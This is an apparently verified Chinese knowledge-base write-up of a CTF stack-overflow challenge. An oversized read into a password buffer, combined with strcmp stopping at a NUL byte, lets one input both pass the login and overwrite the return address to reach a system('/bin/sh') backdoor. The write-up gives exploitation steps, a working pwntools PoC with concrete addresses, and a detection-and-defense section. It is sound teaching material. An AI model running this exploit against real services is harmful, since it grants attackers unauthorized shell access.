---
id: binary-pwn-stack-strcmp-nullbyte-read-overflow-ret2backdoor
title: 定长 read 读长大于口令缓冲 + strcmp 在 NUL 处判等：正确口令后接 \0 填充，边过校验边覆盖返回地址跳后门
type: scenario
domain: binary
path: binary/pwn/stack
technique: strcmp-null-terminated-password-read-overflow-ret2text
tags:
- pwn
- stack-overflow
- strcmp
- null-byte
- ret2text
- backdoor
- no-pie
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V433
  verified_at: '2026-11-09T20:08:32+08:00'
  notes: 已对照原文与全部17张截图核对：checksec(Partial RELRO/No canary/NX disabled/No PIE)、login 反编译 read(0,buf,0x40)/read(0,s1,0x40)、strcmp 常量口令、sub_401176 后门 system("/bin/sh") 及 0x40101a/0x40117a payload 与实际调试输出一致；flag 已打通。未验证点：其他目标需按实际反汇编确认后门 +4 入口与对齐。
url: /docs/binary/pwn/stack/binary-pwn-stack-strcmp-nullbyte-read-overflow-ret2backdoor/
draft: false
kb_aliases:
- 口令 NUL 截断
- strcmp 遇 0 判等
- read 多读溢出
- 登录后门
- ret2backdoor
---

## 一句话结论

登录函数把口令 `read` 进 `s1[40]` 却按 0x40 字节读取，多出的 24 字节正好覆盖 s1 后的填充、saved RBP 与 saved RIP；由于校验用 `strcmp`，发送“正确口令 + `\0` + 填充/ROP 字节”即可让 `strcmp` 在 `\0` 处判定相等，`\0` 之后的字节继续用于溢出，函数返回时直接跳到 `system("/bin/sh")` 后门。

## 原理

- 反编译可见 `char buf[32]`（rbp-0x50）与 `char s1[40]`（rbp-0x30），两处读取都是 `read(0, ..., 0x40)`：写 buf 的一处多出 32 字节，写 s1 的一处比缓冲多 24 字节。s1 从 rbp-0x30 开始，0x40 字节读入后覆盖 s1(40 字节)、8 字节填充、saved RBP 和 saved RIP，刚好够 hijack 返回地址。
- `strcmp(s1, "!@#$%^&*()_+")` 在遇到第一个 `\0` 时停止比较，且 `read` 不会自动追加终止符；因此输入“固定口令 + `\0`”时比较结果相等，`\0` 之后的内容不参与比较。攻击者由此在同一个输入里同时完成“通过口令校验”和“覆盖栈帧”。
- 函数返回值 `v0 = strcmp(buf,"root") | strcmp(s1, 固定口令)` 为 0，表现为登录成功；但真正生效的是函数 epilogue：`pop saved rbp`（被填充数据覆盖）后执行 `ret`，CPU 从被覆盖的 saved RIP 取址，直接进入后门 `system("/bin/sh")`，main 中的成功/失败分支都不再执行。
- 成立前提：无 Canary（覆盖可直接生效）、No PIE（后门地址固定 0x400000 基址）、NX 无关（复用已有代码段）。题解还在 saved RBP 槽写入一个 `ret` gadget（0x40101a）作占位/对齐，按具体布局决定是否需要用它调整 16 字节栈对齐。

## 触发条件

- 口令缓冲区使用 `read` 且读入长度大于缓冲尺寸（本例 0x40 vs 40），溢出至少覆盖 saved RIP。
- 口令校验使用 `strcmp`/`strncmp` 之类遇 `\0` 停止的比较；若用 `memcmp` 固定长度比较，NUL 截断不成立。
- 二进制中存在 `system("/bin/sh")` 后门，且未开 PIE/Canary（或已泄露可绕过）。
- 两处 `read` 分次发送：`read` 不按行切分，若用户名与密码一次发出，第一处 `read` 可能把密码字节一并读走。

## 利用步骤

1. `checksec` 确认：Partial RELRO、No canary、NX disabled、No PIE（0x400000）。
2. 反编译 login：`buf[32]@rbp-0x50`、`s1[40]@rbp-0x30`，两个 `read(0, x, 0x40)`，`strcmp(buf,"root")` 与 `strcmp(s1,"!@#$%^&*()_+")`；后门 sub_401176 为 `system("/bin/sh")`。
3. 用户名发送 `root\0`（5 字节），让第一个 `strcmp` 相等且不破坏后续读取。
4. 口令 payload：正确口令 + 若干 `\0`，`ljust(0x30)` 填满 s1 与 8 字节填充；偏移 0x30 的 saved RBP 槽填 `ret` gadget（占位/对齐），偏移 0x38 的 saved RIP 填后门地址 0x40117A（符号 0x401176 的 +4，通常跳过 4 字节 endbr64 序言，按实际反汇编确认）。
5. 函数返回即进入 `system("/bin/sh")`，执行 `cat flag`。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux')

p = remote('target', 10007)
p.sendlineafter(b'username: ', b'root\x00')          # read(0, buf, 0x40)，\0 使 strcmp 判等

payload  = b'!@#$%^&*()_+' + b'\x00' * 0x10          # 正确口令 + \0，strcmp 在 \0 处停止
payload  = payload.ljust(0x30, b'\x00')              # 填满 s1[40] 与 8 字节填充
payload += p64(0x40101a)                             # saved RBP 槽（ret gadget 占位/对齐）
payload += p64(0x40117a)                             # saved RIP -> backdoor system("/bin/sh")
p.sendlineafter(b'password: ', payload)
p.interactive()
```

地址按目标二进制替换；若后门入口不同，需重新确认 saved RIP 偏移（s1 起始到 rbp 的距离 + 8）。

## 变体与关联

- 同函数第一处 `read(0, buf, 0x40)` 写入 buf[32] 也会越界波及相邻 s1，但随后 s1 的 `read` 会覆盖这段数据，等于“自愈”；多个相邻缓冲的溢出要按读取顺序判断最终哪一处可用。
- 关联 [[binary-pwn-stack-strcmp-nullbyte-local-ptr-backfill-ret2text]]：同为 strcmp 的 NUL 截断绕过 + ret2backdoor，但那题溢出发生在另一个漏洞函数的 `memcpy`，还须回填被覆盖的堆指针避免 `free` 崩溃；本题溢出就在登录函数内、无需堆交互，触发条件与利用步骤不同。
- 关联 [[binary-pwn-stack-ret2text-win-plus-one-align]]：后门入口选择与 16 字节栈对齐问题；若跳后门后 `system` 在 `movaps` 崩溃，可换 `ret` gadget 数量或跳后门 +1/+4（取决于序言）。
- 边界：`read` 长度等于缓冲区大小时无溢出；strcmp 前若对输入做了长度/字符集强校验（如要求固定长度且无 NUL），NUL 截断可能被提前拒绝。

## 检测与防御

- 代码审计：`read(fd, buf, n)` 的 n 不得超过 `sizeof(buf)`；口令读取长度应与缓冲区一致。
- 口令比较使用定长比较（`memcmp`、`CRYPTO_memcmp`），先按长度校验再比较，消除 NUL 截断语义。
- 编译加固：`-fstack-protector-strong`（本帧有数组会插 Canary）、PIE、NX、Full RELRO；移除调试后门函数。
- 检测信号：二进制中同时出现“定长栈缓冲 + read 多读 + strcmp 常量口令 + system("/bin/sh") 后门”组合时优先排查。
